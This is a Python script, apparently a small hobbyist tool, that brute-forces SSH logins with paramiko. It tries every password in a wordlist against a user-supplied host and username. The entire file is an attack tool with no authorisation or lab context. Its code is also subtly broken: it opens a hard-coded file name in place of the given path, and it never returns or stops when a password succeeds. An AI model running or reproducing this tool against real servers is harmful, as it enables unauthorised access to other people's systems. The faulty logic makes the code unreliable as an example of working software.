
##  Libraries required to run the code
import paramiko
import argparse


##  Function for attempting to connect to the SSH server
def ssh_bruteforce(host, username, password_list):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

##----------------------------------------------------------------------------------------------------------##

##  Function to read the passwords from a list and try to login to the server using those for credentials
    with open("password_list", 'r') as file:
        for password in file:
            password = password.strip()
            try:
                print(f"Trying password: {password}")
                ssh_client.connect(hostname=host, username=username, password=password, timeout=1)
                print(f'Password found! Password is {password}')
            except paramiko.AuthenticationException:
                print("Incorrect password.")
            except Exception as e:
                print(f"An error has occured: {e}")
                break

##-----------------------------------------------------------------------------------------------------------##

##  Main function that will run the brute force using the input from the terminal and print the results in the terminal as well
def main():
    parser = argparse.ArgumentParser(description="SSH - Brute Force attack tool")
    parser.add_argument("--host", required=True, help="IP-adress of the target SSH server")
    parser.add_argument("--username", required=True, help="Username for SSH login")
    parser.add_argument("--password_list", required=True, help="Path to the password list to be tested")

    args = parser.parse_args()

    password = ssh_bruteforce(args.host, args.username, args.password_list)
    if password:
        print(f"[+] Password for {args.username}@{args.host} is {password}")
    else:
        print("[-] No password was found in the list")


if __name__ == "__main__":
    main()
